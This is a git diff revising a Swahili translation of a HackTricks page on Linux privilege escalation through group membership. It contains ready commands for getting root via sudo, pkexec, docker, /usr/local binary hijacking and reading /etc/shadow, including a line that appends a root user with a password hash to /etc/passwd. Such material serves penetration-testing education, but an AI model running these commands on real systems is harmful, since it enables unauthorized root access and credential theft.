@@ -6,10 +6,10 @@
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
+* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
 * Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
@@ -28,24 +28,24 @@ Njia nyingine za kusaidia HackTricks:
 ```
 Hii inamaanisha kwamba **mtumiaji yeyote ambaye ni mwanachama wa kikundi cha sudo au admin anaweza kutekeleza chochote kama sudo**.
 
-Ikiwa hii ndiyo hali, **kwa kuwa mtumiaji wa root unaweza tu kutekeleza**:
+Ikiwa hii ndiyo hali, **kutakuwa na njia rahisi ya kuwa root kwa kutekeleza**:
 ```
 sudo su
 ```
 ### PE - Mbinu 2
 
-Pata programu zote za suid na angalia kama kuna programu ya **Pkexec**:
+Pata binaries zote za suid na angalia kama kuna binary **Pkexec**:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
 Ikiwa unagundua kwamba binary **pkexec ni binary ya SUID** na wewe ni mwanachama wa **sudo** au **admin**, labda unaweza kutekeleza binaries kama sudo ukitumia `pkexec`.\
-Hii ni kwa sababu kawaida hizo ni makundi ndani ya **sera ya polkit**. Sera hii kimsingi inatambua ni makundi gani yanaweza kutumia `pkexec`. Angalia na:
+Hii ni kwa sababu kawaida hizo ni makundi ndani ya **sera ya polkit**. Sera hii kimsingi inatambua ni makundi gani yanaweza kutumia `pkexec`. Angalia hivyo kwa:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
 Hapo utapata ni vikundi vipi vinaruhusiwa kutekeleza **pkexec** na **kwa chaguo-msingi** katika baadhi ya disctros za linux vikundi **sudo** na **admin** vinatokea.
 
-Kuwa **root unaweza kutekeleza**:
+Kwa **kuwa root unaweza kutekeleza**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
@@ -55,7 +55,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Si kwa sababu huna ruhusa bali ni kwa sababu hujajaunganishwa bila GUI**. Na kuna njia ya kupita tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **vikao vya ssh 2 tofauti**:
+**Si kwa sababu huna ruhusa bali ni kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho kwa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **vikao vya ssh 2 tofauti**:
 
 {% code title="kikao1" %}
 ```bash
@@ -80,13 +80,13 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 Hii inamaanisha kwamba **mtumiaji yeyote ambaye ni mwanachama wa kikundi cha wheel anaweza kutekeleza chochote kama sudo**.
 
-Ikiwa hii ndiyo hali, **kwa kuwa mtumiaji wa mizizi unaweza tu kutekeleza**:
+Ikiwa hii ndiyo hali, **kutakuwa na uwezekano wa kuwa root unaweza tu kutekeleza**:
 ```
 sudo su
 ```
 ## Kikundi cha Shadow
 
-Watumiaji kutoka kwa **kikundi cha shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
+Watumiaji kutoka **kikundi cha shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
@@ -94,7 +94,7 @@ Jadi, soma faili na jaribu **kuvunja baadhi ya hashes**.
 
 ## Kikundi cha Wafanyakazi
 
-**staff**: Inaruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji mamlaka ya mzizi (kumbuka kwamba programu za kutekelezwa katika `/usr/local/bin` ziko kwenye kifaa cha PATH cha mtumiaji yeyote, na wanaweza "kubadilisha" programu za kutekelezwa katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kikundi "adm", ambacho kina uhusiano zaidi na ufuatiliaji/usalama. [\[chanzo\]](https://wiki.debian.org/SystemGroups)
+**staff**: Inaruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji mamlaka ya mzizi (kumbuka kwamba programu za kutekelezwa katika `/usr/local/bin` ziko kwenye PATH ya mtumiaji yeyote, na wanaweza "kubadilisha" programu za kutekelezwa katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kikundi "adm", ambacho kina uhusiano zaidi na ufuatiliaji/usalama. [\[chanzo\]](https://wiki.debian.org/SystemGroups)
 
 Katika usambazaji wa debian, `$PATH` inaonyesha kuwa `/usr/local/` itatekelezwa kwa kipaumbele cha juu, iwe wewe ni mtumiaji aliye na mamlaka au la.
 ```bash
@@ -104,9 +104,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Ikiwa tunaweza kuchukua udhibiti wa baadhi ya programu katika `/usr/local`, tunaweza kwa urahisi kupata ruhusa ya msingi.
+Ikiwa tunaweza kuchukua udhibiti wa baadhi ya programu katika `/usr/local`, tunaweza kwa urahisi kupata mizizi.
 
-Kuchukua udhibiti wa programu ya `run-parts` ni njia rahisi ya kupata ruhusa ya msingi, kwa sababu programu nyingi zitaruhusu `run-parts` kama (crontab, wakati wa kuingia kwa ssh).
+Kuchukua udhibiti wa programu ya `run-parts` ni njia rahisi ya kupata mizizi, kwa sababu programu nyingi zitarudisha `run-parts` kama (crontab, wakati wa kuingia kwa ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -164,7 +164,7 @@ Tafadhali kumbuka kwamba kwa kutumia debugfs unaweza pia **kuandika faili**. Kwa
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** (kama vile `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Ruhusa imekataliwa**".
+Hata hivyo, ikiwa utajaribu **kuandika faili zinazomilikiwa na root** (kama vile `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Ruhusa imekataliwa**".
 
 ## Kikundi cha Video
 
@@ -174,24 +174,24 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-**tty1** inamaanisha kuwa mtumiaji **yossi ameingia kimwili** kwenye terminali kwenye mashine.
+**tty1** inamaanisha kuwa mtumiaji **yossi ameingia kimwili** kwenye terminal kwenye mashine.
 
 Kikundi cha **video** kina ruhusa ya kuona matokeo ya skrini. Kimsingi unaweza kuchunguza skrini. Ili kufanya hivyo, unahitaji **kunasa picha ya sasa kwenye skrini** kwa data ghafi na kupata azimio linalotumiwa na skrini hiyo. Data ya skrini inaweza kuokolewa kwenye `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Kufungua **picha ya raw** unaweza kutumia **GIMP**, chagua faili ya \*\*`screen.raw` \*\* na chagua aina ya faili **Raw image data**:
+Kufungua picha ya raw unaweza kutumia **GIMP**, chagua faili ya \*\*`screen.raw` \*\* na chagua aina ya faili **Raw image data**:
 
-![](<../../../.gitbook/assets/image (287) (1).png>)
+![](<../../../.gitbook/assets/image (460).png>)
 
 Kisha badilisha Upana na Urefu kwa vile vilivyotumiwa kwenye skrini na angalia Aina tofauti za Picha (na chagua ile inayoonyesha vizuri skrini):
 
-![](<../../../.gitbook/assets/image (288).png>)
+![](<../../../.gitbook/assets/image (314).png>)
 
 ## Kikundi cha Root
 
-Inaonekana kwa chaguo-msingi **wanachama wa kikundi cha root** wanaweza kupata ufikivu wa **kurekebisha** baadhi ya **faili za usanidi wa huduma** au baadhi ya **faili za maktaba** au **vitu vingine vya kuvutia** ambavyo vinaweza kutumika kwa kuboresha mamlaka...
+Inaonekana kwa chaguo-msingi **wanachama wa kikundi cha root** wanaweza kupata ufikivu wa **kurekebisha** baadhi ya **faili za usanidi wa huduma** au baadhi ya **faili za maktaba** au **vitu vingine vya kuvutia** vinavyoweza kutumika kwa kuboresha mamlaka...
 
 **Angalia ni faili gani wanachama wa root wanaweza kurekebisha**:
 ```bash
@@ -199,7 +199,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Kikundi cha Docker
 
-Unaweza **kufunga mfumo wa mizizi wa kompyuta mwenyeji kwa kiasi cha kifaa**, hivyo wakati kifaa kinaanza mara moja hupakia `chroot` kwenye kiasi hicho. Hii kimsingi inakupa mamlaka ya mizizi kwenye kompyuta.
+Unaweza **kufunga mfumo wa faili wa mzizi wa kompyuta mwenyeji kwa kiasi cha kifaa cha kifaa**, kwa hivyo wakati kifaa kinaanza mara moja hupakia `chroot` kwenye kiasi hicho. Hii kimsingi inakupa mizizi kwenye kompyuta.
 ```bash
 docker image #Get images from the docker service
 
@@ -211,18 +211,6 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Mwishowe, ikiwa hupendi mapendekezo yoyote yaliyotangulia, au hayafanyi kazi kwa sababu fulani (firewall ya docker api?) unaweza jaribu **kuendesha kontena lenye mamlaka na kutoroka kutoka kwake** kama ilivyoelezwa hapa:
-
-{% content-ref url="../docker-security/" %}
-[docker-security](../docker-security/)
-{% endcontent-ref %}
-
-Ikiwa una ruhusa ya kuandika juu ya soketi ya docker soma [**chapisho hili kuhusu jinsi ya kuongeza mamlaka kwa kudhuru soketi ya docker**](../#writable-docker-socket)**.**
-
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
-
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
-
 ## Kikundi cha lxc/lxd
 
 {% content-ref url="./" %}
@@ -232,9 +220,9 @@ Ikiwa una ruhusa ya kuandika juu ya soketi ya docker soma [**chapisho hili kuhus
 ## Kikundi cha Adm
 
 Kawaida **wanachama** wa kikundi cha **`adm`** wana ruhusa ya **kusoma faili za logi** zilizoko ndani ya _/var/log/_.\
-Hivyo, ikiwa umedukua mtumiaji ndani ya kikundi hiki unapaswa bila shaka **kuchunguza logi**.
+Hivyo, ikiwa umefanikiwa kudukua mtumiaji ndani ya kikundi hiki unapaswa bila shaka **kuangalia kwenye logi**.
 
 ## Kikundi cha Auth
 
 Ndani ya OpenBSD kikundi cha **auth** kawaida kinaweza kuandika kwenye folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
-Ruhusa hizi zinaweza kutumiwa vibaya na shambulio lifuatalo kwa lengo la **kuongeza mamlaka** hadi kwa root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+Ruhusa hizi zinaweza kutumiwa vibaya na shambulio lifuatalo kwa lengo la **kuinua upendeleo** hadi kwa root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
